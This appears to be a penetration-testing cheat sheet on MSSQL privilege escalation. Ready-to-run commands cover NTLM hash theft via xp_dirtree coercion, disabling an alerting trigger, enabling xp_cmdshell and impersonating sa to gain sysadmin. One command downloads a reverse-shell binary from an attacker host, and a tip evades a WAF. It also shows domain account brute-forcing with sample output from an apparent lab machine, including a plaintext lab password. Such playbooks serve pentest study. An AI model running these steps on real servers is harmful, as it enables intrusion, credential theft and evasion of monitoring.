---
title: "MSSQL Privilege Escalation"
date: 2025-7-17
tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "Mssql", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID"]
---

### Enum

#### 1. Import Module

```console
. .\PowerUpSQL.ps1
```

#### 2. Audit

```console
Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose
```

#### 3. Execute Query

```console
Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose
```

<small>*Ref: [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)*</small>

---

### Abuse #1: Steal NTLM hash

#### 1. Start a Listener

```console
sudo responder -I tun0
```

#### 2. Coercing Authentication

{{< tab set1 tab1 >}}Method 1{{< /tab >}}
{{< tab set1 tab2 >}}Method 2{{< /tab >}}
{{< tab set1 tab3 >}}Method 3{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
xp_dirtree '\\<LOCAL_IP>\any\thing';
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
load_file('\\<LOCAL_IP>\any\thing');
```

{{< /tabcontent >}}

---

### Abuse #2: Run xp_cmdshell

#### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]

```console
select name from sys.server_triggers;
```

#### 2. Disable Trigger if Any \[Optional\]

```console
disable trigger ALERT_xp_cmdshell on all server;
```

#### 3. Enable xp_cmdshell

```console
enable_xp_cmdshell;
```

#### 4. RCE

```console
xp_cmdshell whoami
```

---

### Abuse #3: Impersonate sa to run xp_cmdshell

#### 1. Add User to Sysadmin

```console
execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
```

#### 2. Check

```console
SELECT is_srvrolemember('sysadmin');
```

#### 3. Enable xp_cmdshell

```console
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

```console
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

#### 4. RCE

```console
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
```

<small>*Note: try xp_cmDshElL to bypass WAF*</small>

---

### Abuse #4: Domain Users Enum

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tab set2 tab3 >}}Metasploit{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Get Domain Name

```console
SELECT DEFAULT_DOMAIN();
```

```console {class="sample-code"}
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN();
             
----------   
REDELEGATE
```

#### 2. Get Hex SID

```console
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('<DOMAIN>\Domain Admins'));
```

```console {class="sample-code"}
SQL (SQLGuest  guest@master)> SELECT master.dbo.fn_varbintohexstr(SUSER_SID('REDELEGATE\Domain Admins'));
                                                             
----------------------------------------------------------   
0x010500000000000515000000a185deefb22433798d8e847a00020000
```

#### 3. Convert Hex SID to Readable String (Powershell)

```console
# Without `0x`
$hexSid = "<HEX_SID>"
$sidBytes = [byte[]]::new($hexSid.Length / 2)
for ($i = 0; $i -lt $hexSid.Length; $i += 2) {
    $sidBytes[$i / 2] = [Convert]::ToByte($hexSid.Substring($i, 2), 16)
}
$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
$sid.Value
```

```console {class="sample-code"}
PS C:\Users\john> $hexSid = "010500000000000515000000a185deefb22433798d8e847a00020000"
PS C:\Users\john> $sidBytes = [byte[]]::new($hexSid.Length / 2)
PS C:\Users\john> for ($i = 0; $i -lt $hexSid.Length; $i += 2) {
>>     $sidBytes[$i / 2] = [Convert]::ToByte($hexSid.Substring($i, 2), 16)
>> }
PS C:\Users\john> $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
PS C:\Users\john> $sid.value
S-1-5-21-4024337825-2033394866-2055507597-512
```

#### 4. Domain Users Enum

```console
#!/bin/bash

USERNAME="<USER>"
PASSWORD="<PASSWORD>"
SERVER="<TARGET>"
SID_BASE="<SID_BASE>"

query_sid() {
    local sid="$1"
    local full_sid="${SID_BASE}-${sid}"
    local sql="SELECT SUSER_SNAME(SID_BINARY(N'$full_sid'))"

    echo "$sql" | impacket-mssqlclient "$USERNAME:$PASSWORD@$SERVER" -file /dev/stdin 2>/dev/null | grep -a REDELEGATE
}

for sid in {1100..1200}; do
    query_sid "$sid"
done
```

```console {class="sample-code"}
$ ./domain_users_enum.sh   
REDELEGATE\FS01$   
REDELEGATE\Christine.Flanders   
REDELEGATE\Marie.Curie   
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import Module

```console
Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
Warning: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
```

#### 2. Domain Users Enum

```console
Get-SqlServer-Enum-WinAccounts -SQLServerInstance '<TARGET>' -SqlUser '<USER>' -SqlPass '<PASSWORD>' –FuzzNum 10000
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Get-SqlServer-Enum-WinAccounts -SQLServerInstance "10.129.234.50" -SqlUser 'SQLGuest' -SqlPass 'zDPBpaF4FywlqIv11vii' –FuzzNum 10000
[*] Attempting to authenticate to 10.129.234.50 as the login SQLGuest...
[*] Connected.
[*] Enumerating domain...
[*] Domain found: REDELEGATE
[*] Enumerating domain SID...
[*] Domain SID found: 010500000000000515000000A185DEEFB22433798D8E847A
[*] Brute forcing 10000 RIDs...
[*] - WIN-Q13O908QBPG\Administrator
[*] - REDELEGATE\Guest
[*] - REDELEGATE\krbtgt
[*] - REDELEGATE\Domain Guests
---[SNIP]---
[*] 34 domain accounts / groups were found.

name
----
REDELEGATE\Allowed RODC Password Replication Group
REDELEGATE\Cert Publishers
REDELEGATE\Christine.Flanders
---[SNIP]---
```

<small>*Ref: [Get-SqlServer-Enum-WinAccounts.psm1](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

#### 1. Metasploit

```console
msfconsole
```

#### 2. Use Module

```console
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

#### 3. Set Params

```console
set RHOST <TARGET>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOST 10.129.234.50
RHOST => 10.129.234.50
```

```console
set RPORT <PORT>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RPORT 1433
RPORT => 1433
```

```console
set USERNAME <USER>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set USERNAME SQLGuest
USERNAME => SQLGuest
```

```console
set PASSWORD <PASSWORD>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set PASSWORD zDPBpaF4FywlqIv11vii
PASSWORD => zDPBpaF4FywlqIv11vii
```

```console
set fuzznum 10000
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set fuzznum 10000
fuzznum => 10000
```

#### 4. Domain Users Enum

```console
run
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
[*] Running module against 10.129.234.50
[*] 10.129.234.50:1433 - Attempting to connect to the database server at 10.129.234.50:1433 as SQLGuest...
[+] 10.129.234.50:1433 - Connected.
[*] 10.129.234.50:1433 - SQL Server Name: WIN-Q13O908QBPG
[*] 10.129.234.50:1433 - Domain Name: REDELEGATE
[+] 10.129.234.50:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
[*] 10.129.234.50:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.129.234.50:1433 -  - WIN-Q13O908QBPG\Administrator
[*] 10.129.234.50:1433 -  - REDELEGATE\Guest
[*] 10.129.234.50:1433 -  - REDELEGATE\krbtgt
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Admins
---[SNIP]---
```

{{< /tabcontent >}}

---

### Abuse #5: Run External Script

#### 1. Run External Script (Python)

```console
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
```
